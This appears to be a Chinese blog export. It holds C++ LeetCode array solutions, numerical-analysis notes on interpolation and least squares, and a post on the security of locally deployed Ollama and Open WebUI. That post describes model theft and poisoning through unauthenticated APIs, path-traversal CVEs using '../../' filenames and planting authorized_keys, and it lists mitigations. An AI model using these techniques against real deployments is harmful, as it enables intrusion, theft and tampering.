二分查找\n坚持循环不变量原则！！！\n\n对区间的定义想清楚，区间的定义就是不变量\n保持不变量，就是在while寻找中每一次边界的处理都要坚持根据区间的定义来操作\n\n 左闭右闭\nvector&lt;int&gt;&amp; nums\n定义target在一个在左闭右闭的区间里，即[left, right]\nclass Solution&#123;public:    int search(vector&lt;int&gt;&amp; nums,int target) &#123;        int left=0;        int right=nums.size()-1;        while(left&lt;=right)&#123;            int mid=(left+right)/2;            if(nums[mid]&gt;target)&#123;                right=mid-1;            &#125;else if(nums[mid]&lt;target)&#123;                left=mid+1;            &#125;else if(nums[mid]==target)&#123;                return mid;            &#125;        &#125;        return -1;    &#125;&#125;;\n\n时间复杂度：O(logn)\n空间复杂度：O(1)\n\n 左闭右开\n定义target在一个在左闭右开的区间里，即[left, right)\nclass Solution&#123;public:    int search(vector&lt;int&gt;&amp; nums,int target)&#123;        int left=0;        int right=nums.size();        while(left&lt;right)&#123;            int mid=(left+right)/2;            if(nums[mid]&gt;target)&#123;                right=mid;            &#125;else if(nums[mid]&lt;target)&#123;                left=mid+1;            &#125;else if(nums[mid]==target)&#123;                return mid;            &#125;        &#125;        return -1;    &#125;&#125;;\n\n时间复杂度：O(logn)\n空间复杂度：O(1)\n\n\n改进：\nmid=(left+right)&gt;&gt;1;\n&gt;&gt;\n\n 移除元素\n27. 移除元素\n误区：直接删掉多余的元素\n数组的元素在内存地址中是连续的，不能单独删除数组中的某个元素，只能覆盖\n 暴力法\n两层for循环，一个for循环遍历数组元素 ，第二个for循环更新数组\n\nclass Solution &#123;public:    int removeElement(vector&lt;int&gt;&amp; nums, int val) &#123;        int size=nums.size();        for(int i=0;i&lt;size;i++)&#123;            if(nums[i]==val)&#123;                for (int j=i+1;j&lt;size;j++)&#123;                    nums[j-1]=nums[j];                &#125;                i--;                size--;            &#125;        &#125;        return size;    &#125;&#125;;\n\n时间复杂度：O(n2)\n空间复杂度：O(1)\n\n 双指针法\n\n快指针：寻找新数组的元素，新数组就是不含有目标元素的数组\n慢指针：指向更新新数组下标的位置\n\n\nclass Solution &#123;public:    int removeElement(vector&lt;int&gt;&amp; nums, int val) &#123;        int slowIndex=0;        for(int fastIndex=0;fastIndex&lt;nums.size();fastIndex++)&#123;            if(nums[fastIndex]!=val)&#123;                nums[slowIndex++]=nums[fastIndex];            &#125;        &#125;        return slowIndex;    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(1)\n\n 有序数组的平方\n977. 有序数组的平方\n 暴力法\nclass Solution &#123;public:    vector&lt;int&gt; sortedSquares(vector&lt;int&gt;&amp; nums) &#123;        for(int i=0;i&lt;nums.size();i++)&#123;            nums[i]*=nums[i];        &#125;        sort(nums.begin(),nums.end());        return nums;    &#125;&#125;;\n\n时间复杂度：O(n+nlogn)\n\n 双指针法\n数组有序，则数组平方的最大值就在数组的两端，不是最左边就是最右边，不可能是中间\ni指向起始位置，j指向终止位置，定义和nums一样大小的数组result，k指向result数组终止位置\n\nA[i]*A[i]&lt;A[j]*A[j]那么result[k–]=A[j]*A[j];\nA[i]*A[i]&gt;=A[j]*A[j]则result[k–]=A[i]*A[i];\n\n\nclass Solution &#123;public:    vector&lt;int&gt; sortedSquares(vector&lt;int&gt;&amp; nums) &#123;        int i=0;        int j=nums.size()-1;        int k=j;        vector&lt;int&gt; result(nums.size(),0);//创建与nums同长，初值均为0的result数组        for(;i&lt;=j;)&#123;            if(nums[i]*nums[i]&lt;nums[j]*nums[j])&#123;                result[k--]=nums[j]*nums[j];                j--;            &#125;else&#123;                result[k--]=nums[i]*nums[i];                i++;            &#125;        &#125;        return result;    &#125;&#125;;\n\n时间复杂度：O(n)\n\n 长度最小的子数组\n209. 长度最小的子数组\n 暴力法\n两个for循环不断的寻找符合条件的子序列\nclass Solution &#123;public:    int minSubArrayLen(int target, vector&lt;int&gt;&amp; nums) &#123;        int result=nums.size();        int sum=0;        int subLength=0;        for (int i=0;i&lt;nums.size();i++)&#123;            sum=0;            for(int j=i;j&lt;nums.size();j++)&#123;                sum+=nums[j];                if(sum&gt;=target)&#123;                    subLength=j-i+1;                    result=result&lt;subLength?result:subLength;                    break;                &#125;            &#125;        &#125;        return result==nums.size()?0:result;    &#125;&#125;;\n\n时间复杂度：O(n2)\n\n 滑动窗口\n只用一个for循环表示滑动窗口的终止位置\n\n\n窗口的起始位置如何移动：如果当前窗口的值大于等于target了，窗口就要向前移动了（也就是该缩小了）\n窗口的结束位置如何移动：窗口的结束位置就是遍历数组的指针，也就是for循环里的索引\n\n滑动窗口的精妙之处在于根据当前子序列和大小的情况，不断调节子序列的起始位置\nclass Solution &#123;public:    int minSubArrayLen(int target, vector&lt;int&gt;&amp; nums) &#123;        int i=0;        int sum=0;        int sublength=0;        int result=INT32_MAX;        for(int j=0;j&lt;nums.size();j++)&#123;            sum+=nums[j];            while(sum&gt;=target)&#123;                sublength=j-i+1;                result=result&lt;sublength?result:sublength;                sum-=nums[i++];//体现滑动窗口的精髓之处，不断变更i（子序列的起始位置）            &#125;        &#125;        return result==INT32_MAX?0:result;    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(1)\n\n\nQ：时间复杂度是O(n)的原因？\nA：不要以为for里放一个while就以为是O(n2)，主要得看每一个元素被操作的次数，每个元素在滑动窗后进来操作一次，出去操作一次，每个元素都是被操作两次，所以时间复杂度是2×n也就是O(n)\n\n 螺旋矩阵II\n59. 螺旋矩阵 II\n坚持每条边左闭右开的原则\n\n每个拐角处让给新的一条边来继续画\n\n\n填充上行从左到右\n填充右列从上到下\n填充下行从右到左\n填充左列从下到上\n\nclass Solution &#123;public:    vector&lt;vector&lt;int&gt;&gt; generateMatrix(int n) &#123;        vector&lt;vector&lt;int&gt;&gt; res(n,vector&lt;int&gt;(n,0));        int startx=0,starty=0;//定义每循环一个圈的起始位置        int loop=n/2;//每个圈循环几次，例如n为奇数3，那么loop = 1 只是循环一圈，矩阵中间的值需要单独处理        int mid=n/2;//矩阵中间的位置，例如：n为3，中间的位置就是(1，1)，n为5，中间位置为(2,2)        int count=1;//用来给矩阵中每一个空格赋值        int offset=1;//需要控制每一条边遍历的长度，每次循环右边界收缩一位        int i,j;        while(loop--)&#123;            i=startx;            j=starty;            //下面开始的四个for就是模拟转了一圈            //模拟填充上行从左到右(左闭右开)            for(;j&lt;n-offset;j++)&#123;                res[i][j]=count++;            &#125;            //模拟填充右列从上到下(左闭右开)            for(;i&lt;n-offset;i++)&#123;                res[i][j]=count++;            &#125;            //模拟填充下行从右到左(左闭右开)            for(;j&gt;starty;j--)&#123;                res[i][j]=count++;            &#125;            //模拟填充左列从下到上(左闭右开)            for(;i&gt;startx;i--)&#123;                res[i][j]=count++;            &#125;            //第二圈开始的时候，起始位置要各自加1，例如：第一圈起始位置是(0,0)，第二圈起始位置是(1,1)            startx++;            starty++;            //offset控制每一圈里每一条边遍历的长度            offset++;        &#125;        //如果n为奇数的话，需要单独给矩阵最中间的位置赋值        if(n%2)&#123;            res[mid][mid]=count;        &#125;        return res;    &#125;&#125;;\n\n时间复杂度：O(n2)\n空间复杂度：O(1)\n\n 区间和\n 前缀和\n重复利用计算过的子数组之和，从而降低区间查询需要累加计算的次数\n统计vec[i]这个数组上的区间和2~5\n先做累加，即p[i]表示下标0到i的vec[i]累加之和，有Σ(vec[2]-vec[5])=p[5]-p[1]\np[1]=vec[0]+vec[1];p[5]=vec[0]+vec[1]+vec[2]+vec[3]+vec[4]+vec[5];p[5]-p[1]=vec[2]+vec[3]+vec[4]+vec[5];\n\n个人理解就是空间换时间\n\n\nC++代码面对大量数据读取输出操作，最好用scanf和printf，耗时会小很多\n#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;int main()&#123;    int n,a,b;    int presum=0;    cin&gt;&gt;n;    vector&lt;int&gt; vec(n);    vector&lt;int&gt; p(n);    for(int i=0;i&lt;n;i++)&#123;        cin&gt;&gt;vec[i];//scanf(&quot;%d&quot;, &amp;vec[i]);        presum+=vec[i];        p[i]=presum;    &#125;    while(cin&gt;&gt;a&gt;&gt;b)&#123;//while(~scanf(&quot;%d%d&quot;,&amp;a,&amp;b))//如下解释        int sum;        if(a==0)&#123;            sum=p[b];        &#125;else&#123;            sum=p[b]-p[a-1];            cout&lt;&lt; sum &lt;&lt;endl;//printf(&quot;%d\\n&quot;,sum);        &#125;    &#125;&#125;\n\n在C语言中，scanf函数返回成功读取的输入项数。当输入有效时，返回值通常为2（因为这里要读取两个整数）。~2在大多数平台上结果为-3，是一个非零值，非零值在布尔上下文中被视为true。当输入无效（如输入非整数字符导致读取失败）时，scanf返回EOF（通常为-1），~-1结果为0，0被视为false。所以这个while循环会一直执行，直到输入无效为止\n\n 总结\n数组是存放在连续内存空间上的相同类型数据的集合\n删除或者增添元素的时候，就难免要移动其他元素的地址\n数组的元素是不能删的，只能覆盖\n","tags":["LeetCode"]},{"title":"插值法","url":"/2024/11/16/%E6%8F%92%E5%80%BC%E6%B3%95/","content":" 插值法\n\n函数插值是对函数的离散数据建立简单的数学模型\n设函数y=f(x)在区间[a,b]上的节点x0,x1,…xn上的函数值为y0,y1,…yn，构造一个次数不超过n次的代数多项式\nP(x)=anxn+an−1xn−1+⋯+a1x+a0P(x) = a_n x^n + a_{n-1} x^{n-1} + \\cdots + a_1 x + a_0\nP(x)=an​xn+an−1​xn−1+⋯+a1​x+a0​\n几何意义：通过已知的n+1个相异节点(xi,yi)，i=0,1,…n，构造出一条代数多项式曲线y=P(x)，使其近似于被插值函数曲线y=f(x)\n 拉格朗日插值\n 线性插值\n过(x0, y0), (x1, y1)的直线为\nL(x)=x−x1x0−x1y0+x−x0x1−x0y1L(x) = \\frac{x - x_1}{x_0 - x_1} y_0 + \\frac{x - x_0}{x_1 - x_0} y_1\nL(x)=x0​−x1​x−x1​​y0​+x1​−x0​x−x0​​y1​\n记\nl0(x)=x−x1x0−x1,l1(x)=x−x0x1−x0l_0(x) = \\frac{x - x_1}{x_0 - x_1}, \\quad l_1(x) = \\frac{x - x_0}{x_1 - x_0}\nl0​(x)=x0​−x1​x−x1​​,l1​(x)=x1​−x0​x−x0​​\nl0(x)与l1(x)称为线性插值基函数，且有性质\nl0(x0)=1,l0(x1)=0,l1(x0)=0,l1(x1)=1l_0(x_0) = 1, \\quad l_0(x_1) = 0,\\quad l_1(x_0) = 0, \\quad l_1(x_1) = 1\nl0​(x0​)=1,l0​(x1​)=0,l1​(x0​)=0,l1​(x1​)=1\n 抛物线插值\nl0(x)=(x−x1)(x−x2)(x0−x1)(x0−x2)l_{0}(x) = \\frac{(x - x_{1})(x - x_{2})}{(x_{0} - x_{1})(x_{0} - x_{2})}\nl0​(x)=(x0​−x1​)(x0​−x2​)(x−x1​)(x−x2​)​\nl1(x)=(x−x0)(x−x2)(x1−x0)(x1−x2)l_{1}(x) = \\frac{(x - x_{0})(x - x_{2})}{(x_{1} - x_{0})(x_{1} - x_{2})}\nl1​(x)=(x1​−x0​)(x1​−x2​)(x−x0​)(x−x2​)​\nl2(x)=(x−x0)(x−x1)(x2−x0)(x2−x1)l_{2}(x) = \\frac{(x - x_{0})(x - x_{1})}{(x_{2} - x_{0})(x_{2} - x_{1})}\nl2​(x)=(x2​−x0​)(x2​−x1​)(x−x0​)(x−x1​)​\n因此有\nL(x)=(x−x1)(x−x2)(x0−x1)(x0−x2)y0+(x−x0)(x−x2)(x1−x0)(x1−x2)y1+(x−x0)(x−x1)(x2−x0)(x2−x1)y2L(x) = \\frac{(x - x_1)(x - x_2)}{(x_0 - x_1)(x_0 - x_2)}y_0 + \\frac{(x - x_0)(x - x_2)}{(x_1 - x_0)(x_1 - x_2)}y_1 + \\frac{(x - x_0)(x - x_1)}{(x_2 - x_0)(x_2 - x_1)}y_2\nL(x)=(x0​−x1​)(x0​−x2​)(x−x1​)(x−x2​)​y0​+(x1​−x0​)(x1​−x2​)(x−x0​)(x−x2​)​y1​+(x2​−x0​)(x2​−x1​)(x−x0​)(x−x1​)​y2​\n 拉格朗日插值多项式\nlk(x)=∏i=0i≠knx−xixk−xil_k(x) = \\prod_{\\substack{i=0 \\\\ i \\neq k}}^n \\frac{x - x_i}{x_k - x_i}\nlk​(x)=i=0i=k​∏n​xk​−xi​x−xi​​\nL(x)=∑k=0nlk(x)ykL(x) = \\sum_{k=0}^{n} l_k(x) y_k\nL(x)=k=0∑n​lk​(x)yk​\n\n 余项\n设f(x)在区间[a,b]上有n+1阶导数，则n次插值多项式L(x)对任意x∈[a,b]，有插值余项\nR(x)=f(x)−L(x)=f(n+1)(ξ)(n+1)!ω(x)R(x) = f(x) - L(x) = \\frac{f^{(n+1)}(\\xi)}{(n+1)!} \\omega(x)\nR(x)=f(x)−L(x)=(n+1)!f(n+1)(ξ)​ω(x)\n其中\nω(x)=∏i=0n(x−xi),a&lt;ξ&lt;b\\omega(x) = \\prod_{i=0}^{n} (x - x_i),a&lt;\\xi&lt;b\nω(x)=i=0∏n​(x−xi​),a&lt;ξ&lt;b\n且依赖于x\n 小结\n\n插值多项式L(x)只与数据xi，f(xi)有关，与节点排列顺序无关，与f(x)无关，但余项R(x)与f(x)有关\nf(x)是次数不超过n次的多项式，取n+1个节点插值时，插值多项式就是其自身\n基函数之和为1，l0(x)+l1(x)+…+ln(x)=1\nn+1个节点的插值多项式不超过n次，不超过n+1项，可求插值区间[a,b]上任一点函数的近似值\n内插比外推精度高。当给定m个点，取n+1个节点(n+1≤m)构造插值多项式，求x点的函数值时，n+1个节点取尽可能靠近x时，余项小，近似程度高\n当节点数变化时，需重新计算全部基函数，因为基函数和每一个节点都有关\nn=1时是线性插值，n=2时是抛物线插值\n\n 牛顿插值\n 差商\n\n一阶差商\n\nf[xi,xi+1]=f(xi+1)−f(xi)xi+1−xif[x_{i}, x_{i+1}]=\\frac{f(x_{i+1}) - f(x_i)}{x_{i+1} - x_i}\nf[xi​,xi+1​]=xi+1​−xi​f(xi+1​)−f(xi​)​\n\n二阶差商\n\nf[xi,xi+1,xi+2]=f[xi+1,xi+2]−f[xi,xi+1]xi+2−xif[x_{i}, x_{i+1}, x_{i+2}]=\\frac{f[x_{i+1}, x_{i+2}] - f[x_{i}, x_{i+1}]}{x_{i+2} - x_{i}}\nf[xi​,xi+1​,xi+2​]=xi+2​−xi​f[xi+1​,xi+2​]−f[xi​,xi+1​]​\n\nn阶差商\n\nf[x0,x1,⋯ ,xm]=f[x1,x2,⋯ ,xm]−f[x0,x1,⋯ ,xm−1]xm−x0f[x_0, x_1, \\cdots, x_m] = \\frac{f[x_1, x_2, \\cdots, x_m] - f[x_0, x_1, \\cdots, x_{m-1}]}{x_m - x_0}\nf[x0​,x1​,⋯,xm​]=xm​−x0​f[x1​,x2​,⋯,xm​]−f[x0​,x1​,⋯,xm−1​]​\n\n差商表\n\n\n\n牛顿插值\n\n令\nN(x)=f(x0)+f[x0,x1](x−x0)+f[x0,x1,x2](x−x0)(x−x1)+⋯+f[x0,x1,⋯ ,xn](x−x0)(x−x1)⋯(x−xn−1)N(x) = f(x_0) + f[x_0, x_1](x - x_0) + f[x_0, x_1, x_2](x - x_0)(x - x_1) + \\cdots +f[x_0, x_1, \\cdots, x_n](x - x_0)(x - x_1)\\cdots(x - x_{n-1})\nN(x)=f(x0​)+f[x0​,x1​](x−x0​)+f[x0​,x1​,x2​](x−x0​)(x−x1​)+⋯+f[x0​,x1​,⋯,xn​](x−x0​)(x−x1​)⋯(x−xn−1​)\nR(x)=f[x0,x1,⋯ ,xn,x](x−x0)(x−x1)⋯(x−xn)R(x) = f[x_0, x_1, \\cdots, x_n, x](x - x_0)(x - x_1)\\cdots(x - x_n)\nR(x)=f[x0​,x1​,⋯,xn​,x](x−x0​)(x−x1​)⋯(x−xn​)\n有f(x)=N(x)+R(x)，其中N(x)是f(x)的前n+1项，是x的n次多项式，称为牛顿插值多项式，可看出牛顿插值多项式是上表对角线上的元素与右端同行因子的乘积之和，R(x)是f(x)的最后一项，称之为牛顿插值余项\n 小结\n\n\n牛顿插值多项式N(x)的次数不超过n次，项数不超过n+1项，各项系数是各阶差商\n\n\n在节点上牛顿插值多项式N(x)等于被插值函数f(x)，即N(xi)=f(xi),i=0,1,2,…,n，此时余项R(xi)=0\n\n\n增加一个节点时，只需N(x)再增加一项，N(x)原有各项均不变\n当n=1时，取x0,x1进行插值，有N(x)=f(x0)+f[x0,x1](x-x0)\n当n=2时，取x0,x1,x2进行插值，有N(x)=f(x0)+f[x0,x1](x-x0)+f[x0,x1,x2](x-x0)(x-x1)\n可见，增加一个节点x2时，只是增加了f[x0,x1,x2](x-x0)(x-x1)这一项\n更一般地，设Nn(x)是节点x0,x1,…,xn上的牛顿插值多项式，那么节点x0,x1,…,xn,xn+1上的牛顿插值多项式Nn+1(x)为\nNn+1(x)=Nn(x)+f[x0,x1,…,xn,xn+1](x-x0)(x-x1)…(x-xn)\n上式为Nn+1(x)与Nn(x)的递推关系，即增加一个节点时，只要增加一项即可，而原来的计算结果仍然有用\n\n\n用差商表示的余项式R(x)比用导数表示的插值余项适用范围更广，并且在f(x)的导数不存在，甚至f(x)不连续时仍有意义\n\n\n 埃尔米特插值\n不少问题不但要求在节点上函数值相等，而且还要求它的导数值也相等（即要求在节点上具有一阶光滑度），甚至要求高阶导数也相等，满足这种要求的插值多项式就是埃尔米特（Hermite）插值多项式\n\n{H(xi)=yiH′(xi)=yi′\\left\\{\n\\begin{array}{l}\nH(x_i)=y_i \\\\\nH'(x_i)=y_i'\n\\end{array}\n\\right.\n{H(xi​)=yi​H′(xi​)=yi′​​\n\n\n埃尔米特插值多项式\n\nH2n+1(x)=∑j=0n[1−2(x−xj)∑k=0k≠jn1xj−xk]lj2(x)f(xj)+∑j=0n(x−xj)lj2(x)f′(xj)H_{2n+1}(x) = \\sum_{j=0}^{n} \\left[ 1 - 2(x - x_j) \\sum_{\\substack{k=0 \\\\ k \\neq j}}^{n} \\frac{1}{x_j - x_k} \\right] l_j^2(x) f(x_j) + \\sum_{j=0}^{n} (x - x_j) l_j^2(x) f'(x_j)\nH2n+1​(x)=j=0∑n​⎣⎢⎢⎡​1−2(x−xj​)k=0k=j​∑n​xj​−xk​1​⎦⎥⎥⎤​lj2​(x)f(xj​)+j=0∑n​(x−xj​)lj2​(x)f′(xj​)\n\n插值余项\n\nR2n+1(x)=f(x)−H2n+1(x)=f(2n+2)(ξ)(2n+2)!ω2(x)R_{2n+1}(x) = f(x) - H_{2n+1}(x) = \\frac{f^{(2n+2)}(\\xi)}{(2n+2)!} \\omega^2(x)\nR2n+1​(x)=f(x)−H2n+1​(x)=(2n+2)!f(2n+2)(ξ)​ω2(x)\n其中ξ∈(a,b)，且与x无关，ω(x)=(x-x0)(x-x1)…(x-xn)\n几何意义：曲线y=H2n+1(x)与曲线y=f(x)在插值节点处有公切线\n 高次插值的龙格现象\n\n","tags":["数值分析"]},{"title":"最小二乘法","url":"/2024/11/26/%E6%9C%80%E5%B0%8F%E4%BA%8C%E4%B9%98%E6%B3%95/","content":" 最小二乘法\n\n插值法在整个区间上不能高次插值，误差过大，而分段插值光滑性有限\n\n拟合方法能够回避插值方法的不足，可以利用原函数更多的信息，精度更好\n与分段插值相比，都是利用更多的节点，但是拟合曲线的光滑性要远远好处插值的结果\n对于给定数据(xi,yi)，i=1,2,…,m，在函数空间Φ(x)中存在唯一函数：\nφ∗(x)=a0∗φ0(x)+a1∗φ1(x)+⋯+an∗φn(x)\\varphi^*(x) = a_0^* \\varphi_0(x) + a_1^* \\varphi_1(x) + \\cdots + a_n^* \\varphi_n(x)\nφ∗(x)=a0∗​φ0​(x)+a1∗​φ1​(x)+⋯+an∗​φn​(x)\n使残差平方和最小\n最小二乘解的系数a0*,a1*,…,an*可通过解正则方程组\na0(φk,φ0)+a1(φk,φ1)+⋯+an(φk,φn)=(φk,f)k=0,1,…,n(1)a_0 (\\varphi_k, \\varphi_0) + a_1 (\\varphi_k, \\varphi_1) + \\cdots + a_n (\\varphi_k, \\varphi_n) = (\\varphi_k, f) \\quad k = 0, 1, \\ldots, n\\quad \\quad \\quad (1)\na0​(φk​,φ0​)+a1​(φk​,φ1​)+⋯+an​(φk​,φn​)=(φk​,f)k=0,1,…,n(1)\n求得。用最小二乘解φ*(x)来拟合数据(xi,yi),i=1,2,…,m的平方误差为\n∥δ∥22=(y,y)−(φ∗,φ∗)\\|\\delta\\|_{2}^{2} = (y, y) - (\\varphi^{*}, \\varphi^{*})\n∥δ∥22​=(y,y)−(φ∗,φ∗)\n引进向量f=(f(xi))Tφ0=(1,1,1,1)T，φ1=(xi)T，φ2=(xi2)T，以此类推\n 向量内积\n内积时一定要带权函数，例如\n(φk,φi)=∑j=0mρ(xj)φk(xj)φi(xj)(\\varphi_k, \\varphi_i) = \\sum_{j=0}^{m} \\rho(x_j) \\varphi_k(x_j) \\varphi_i(x_j)\n(φk​,φi​)=j=0∑m​ρ(xj​)φk​(xj​)φi​(xj​)\n(f,φi)=∑j=0mρ(xj)yjφi(xj)(f, \\varphi_i) = \\sum_{j=0}^{m} \\rho(x_j) y_j \\varphi_i(x_j)\n(f,φi​)=j=0∑m​ρ(xj​)yj​φi​(xj​)\n\n用加权最小二乘法进行拟合是对于观测数据(xi,f(xi))，i=1,2,…,m要求在某函数类Φ(x)中寻求一个函数φ(x)，使\n∑i=1mωiεi2=∑i=1mωi[φ(xi)−f(xi)]2\\sum_{i=1}^{m} \\omega_i \\varepsilon_i^2 = \\sum_{i=1}^{m} \\omega_i [\\varphi(x_i) - f(x_i)]^2\ni=1∑m​ωi​εi2​=i=1∑m​ωi​[φ(xi​)−f(xi​)]2\n为最小。式中ωi为一组正数，反映数据(xi,f(xi))特性的权，此时正则方程组仍如式（1），只是其中\n{(φk,φj)=∑i=1mωiφk(xi)φj(xi)(φk,f)=∑i=1mωiφk(xi)f(xi)\\left\\{\n\\begin{array}{l}\n(\\varphi_{k}, \\varphi_{j}) = \\sum_{i=1}^{m} \\omega_{i} \\varphi_{k}(x_{i}) \\varphi_{j}(x_{i}) \\\\\n(\\varphi_{k}, f) = \\sum_{i=1}^{m} \\omega_{i} \\varphi_{k}(x_{i}) f(x_{i})\n\\end{array}\n\\right.\n{(φk​,φj​)=∑i=1m​ωi​φk​(xi​)φj​(xi​)(φk​,f)=∑i=1m​ωi​φk​(xi​)f(xi​)​\n 线性拟合\n设已知数据点(xi,yi)，i=1,2,…,m分布大致为一条直线，利用最小二乘原理，构造拟合直线y=a0+a1x，该直线不是通过所有数据点(xi,yi)，而是使如下残差平方和最小\n∑i=1m[yi−(a0+a1xi)]2\\sum_{i=1}^{m} \\left[ y_i - (a_0 + a_1x_i) \\right]^2\ni=1∑m​[yi​−(a0​+a1​xi​)]2\n此时正则方程组成为\n(∑i=1m1∑i=1mxi∑i=1mxi∑i=1mxi2)(a0a1)=(∑i=1myi∑i=1mxiyi)\\begin{pmatrix}\n\\sum_{i=1}^{m} 1 &amp; \\sum_{i=1}^{m} x_i \\\\\n\\sum_{i=1}^{m} x_i &amp; \\sum_{i=1}^{m} x_i^2\n\\end{pmatrix}\n\\begin{pmatrix}\na_0 \\\\\na_1\n\\end{pmatrix}\n=\n\\begin{pmatrix}\n\\sum_{i=1}^{m} y_i \\\\\n\\sum_{i=1}^{m} x_i y_i\n\\end{pmatrix}\n(∑i=1m​1∑i=1m​xi​​∑i=1m​xi​∑i=1m​xi2​​)(a0​a1​​)=(∑i=1m​yi​∑i=1m​xi​yi​​)\n 二次拟合\n构造拟合曲线为y=a0+a1x+a2x2，有\n[φ0φ0φ0φ1φ0φ2φ1φ0φ1φ1φ1φ2φ2φ0φ2φ1φ2φ2][a0a1a2]=[fφ0fφ1fφ2]\\begin{bmatrix}\n\\varphi_0\\varphi_0 &amp; \\varphi_0\\varphi_1 &amp; \\varphi_0\\varphi_2 \\\\\n\\varphi_1\\varphi_0 &amp; \\varphi_1\\varphi_1 &amp; \\varphi_1\\varphi_2 \\\\\n\\varphi_2\\varphi_0 &amp; \\varphi_2\\varphi_1 &amp; \\varphi_2\\varphi_2\n\\end{bmatrix}\n\\begin{bmatrix}\na_0 \\\\\na_1 \\\\\na_2\n\\end{bmatrix}\n=\n\\begin{bmatrix}\nf\\varphi_0 \\\\\nf\\varphi_1 \\\\\nf\\varphi_2\n\\end{bmatrix}\n⎣⎢⎡​φ0​φ0​φ1​φ0​φ2​φ0​​φ0​φ1​φ1​φ1​φ2​φ1​​φ0​φ2​φ1​φ2​φ2​φ2​​⎦⎥⎤​⎣⎢⎡​a0​a1​a2​​⎦⎥⎤​=⎣⎢⎡​fφ0​fφ1​fφ2​​⎦⎥⎤​\n\n有的拟合函数y=f(x)可通过变换化为线性模型\n\n\n\nxi\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n\nyi\n15.3\n20.5\n27.4\n36.6\n49.1\n65.6\n87.8\n117.6\n\n\nzi\n2.72785\n3.02042\n3.31054\n3.60005\n3.89386\n4.18358\n4.47506\n4.76729\n\n\n\n\nS(x)=aebx两边取对数\n\n解：设z=lny，则z=A+bx，其中A=lna，由zi=lnyi得对z(x)作线性拟合曲线\n取φ0(x)=1，φ1(x)=x，权函数ρ(x)=1，则φ0=(1,1,1,1,1,1,1,1,1)T,φ1=(1,2,3,4,5,6,7,8)T,\nz=(2.72785,3.02042,3.31054,3.60005,3.89386,4.18358,4.47506,4.76729)T,\n得正则方程组\n{8A+36b=29.9786536A+204b=147.13503\\begin{cases}\n8A+36b=29.97865\\\\\n36A+204b=147.13503\n\\end{cases}\n{8A+36b=29.9786536A+204b=147.13503​\n解得A*=2.43686,b*=0.29122，于是有\na∗=eA∗=11.43707a^*=e^{A^*}=11.43707\na∗=eA∗=11.43707\n拟合曲线为：\nφ∗(x)=11.43707e0.29122x\\varphi^*(x)=11.43707e^{0.29122x}\nφ∗(x)=11.43707e0.29122x\n\n 用最小二乘法求方程组的近似解\n{3x−2y=12x+y=2x−4y=−13x+2y=−3\\left\\{\n\\begin{array}{l}\n3x - 2y = 1 \\\\\n2x + y = 2 \\\\\nx - 4y = -1 \\\\\n3x + 2y = -3\n\\end{array}\n\\right.\n⎩⎪⎪⎪⎨⎪⎪⎪⎧​3x−2y=12x+y=2x−4y=−13x+2y=−3​\n解：设\nG(x,y)=(3x−2y−1)2+(2x+y−2)2+(x−4y+1)2+(3x+2y+3)2G(x, y) = (3x - 2y - 1)^2 + (2x + y - 2)^2 + (x - 4y + 1)^2 + (3x + 2y + 3)^2\nG(x,y)=(3x−2y−1)2+(2x+y−2)2+(x−4y+1)2+(3x+2y+3)2\n令\n∂G∂x=∂G∂y=0\\frac{\\partial G}{\\partial x} = \\frac{\\partial G}{\\partial y} = 0\n∂x∂G​=∂y∂G​=0\n有\n{6(3x−2y−1)+4(2x+y−2)+2(x−4y+1)+6(3x+2y+3)=0−4(3x−2y−1)+2(2x+y−2)−8(x−4y+1)+4(3x+2y+3)=0\\left\\{\n\\begin{array}{l}\n6(3x - 2y - 1) + 4(2x + y - 2) + 2(x - 4y + 1) + 6(3x + 2y + 3) = 0 \\\\\n-4(3x - 2y - 1) + 2(2x + y - 2) - 8(x - 4y + 1) + 4(3x + 2y + 3) = 0\n\\end{array}\n\\right.\n{6(3x−2y−1)+4(2x+y−2)+2(x−4y+1)+6(3x+2y+3)=0−4(3x−2y−1)+2(2x+y−2)−8(x−4y+1)+4(3x+2y+3)=0​\n即\n{23x−2y=−3−2x+25y=−2\\left\\{\n\\begin{array}{l}\n23x - 2y = -3 \\\\\n-2x + 25y = -2\n\\end{array}\n\\right.\n{23x−2y=−3−2x+25y=−2​\n解得：x=-0.138354，y=-0.091068\n","tags":["数值分析"]},{"title":"本地化部署AI安全问题","url":"/2025/05/04/%E6%9C%AC%E5%9C%B0%E5%8C%96%E9%83%A8%E7%BD%B2AI%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/","content":"腾讯安全应急响应中心DeepSeek本地化部署有风险！快来看看你中招了吗？\n Ollama\nOllama默认启动时会开放11434端口，在此端口上公开使用restful api执行核心功能，例如下载模型，上传模型，模型对话等等。默认情况下Ollama只会在本地开放端口，但是在Ollama的Docker中，默认会以root权限启动，并且开放到公网上\nOllama对这些接口普遍没有鉴权，导致攻击者扫描到这些Ollama的开放服务后可以进行一系列攻击手段：\n\n模型删除\n\n例如，通过接口删除模型\n\n模型窃取\n\n通过接口查看Ollama模型\nOllama支持自定义镜像源，自建一个镜像服务器，再通过接口就能轻松窃取私有模型文件\n\n算力窃取\n\n通过接口查看Ollama模型。之后便能用请求对话，窃取了目标机器的算力\n\n模型投毒\n\n可以通过接口查看正在运行的模型，接着可以用下载有毒的模型，通过删除正常模型，在通过接口迁移有毒模型到正常模型路径，通过有毒模型污染使用者的对话\n\n远程命令执行漏洞CVE-2024-37032\n\nCVE-2024-37032是Ollama开源框架中一个严重的路径遍历漏洞，允许远程代码执行（RCE），CVSSv3评分为9.1。该漏洞影响Ollama 0.1.34之前的版本，通过自建镜像伪造manifest文件，实现任意文件读写和远程代码执行\n 缓解方案\n升级到最新版Ollama，但是Ollama官方目前无任何鉴权方案，运行Ollama serve时确认环境变量OLLAMA_HOST为本地地址，避免公网运行\n建议本地运行Ollama再使用反向代理工具（如Nginx）为服务端增加访问保护\n Open WebUI\nOpen WebUI是现在最流行的大模型对话WebUI，包含大模型聊天，上传图片，RAG等多种功能且方便与Ollama集成。也是现在DeepSeek本地化部署常见的搭配\n\nCVE-2024-6707\n\n用户通过Open WebUI的HTTP界面点击消息输入框左侧的加号（+）上传文件时，文件会被存储到静态上传目录。上传文件名可伪造，未进行校验，允许攻击者通过构造包含路径遍历字符（如…/…/）的文件名，将文件上传至任意目录\n攻击者可通过上传恶意模型（如包含Python序列化对象的文件），反序列化后执行任意代码，或通过上传authorized_keys实现远程命令执行\n\n 